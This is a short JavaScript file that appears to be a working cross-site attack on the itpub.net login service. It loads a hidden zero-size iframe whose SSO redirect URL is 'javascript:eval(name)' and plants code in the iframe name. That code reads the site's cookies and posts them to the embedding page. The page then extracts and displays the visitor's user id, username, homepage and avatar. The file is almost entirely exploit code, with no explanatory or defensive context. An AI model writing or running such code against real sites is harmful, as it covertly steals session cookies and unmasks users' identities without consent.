// 用户id  个人图像   用户名  个人主页

function n(e) {
  console.log(e)
  if ('itpub' === e.data.source) {
    var n = e.data.d,
      a = decodeURIComponent(
        (function (t, e) {
          for (var n = t + '=', a = e.split(';'), i = 0; i < a.length; i++) {
            var d = a[i].trim()
            if (0 == d.indexOf(n)) return d.substring(n.length, d.length)
          }
          return ''
        })('account_user', n)
      ).split('|'),
      i = {
        valid: !0,
        data: {
          uid: a[0],
          home: 'http://itpub.net/author/'.concat(a[0]),
          username: a[1],
          avatar: 'https://account.itpub.net/api/avatar.php?uid='.concat(a[0]),
        },
      }

    let innerHTML = `
      <div class='item'>
        <p class='title'>itpub</p>
        <p>个人主页: ${i.data.home}</p>
        <p>用户名: ${i.data.username}</p>
        <p>图像: ${i.data.avatar}</p>
      </div>
    `
    let dom = document.createElement('div')
    dom.innerHTML = innerHTML

    document.getElementById('content').appendChild(dom)
    console.log(i)
  }
}
function itpub() {
  var t = document.createElement('iframe')
  t.src = 'http://account.itpub.net/login/sso?url=javascript%3Aeval%28name%29'
  t.width = 0
  t.height = 0
  t.style.borderWidth = 0
  t.name =
    '\n    let data = document.cookie;\n    let d = {source: "itpub", d: data};\n    window.parent.postMessage(d, "*");\n  '
  document.documentElement.appendChild(t)
}
window.addEventListener('message', n, !1)
// window.addEventListener('load', function () {
itpub()
// })
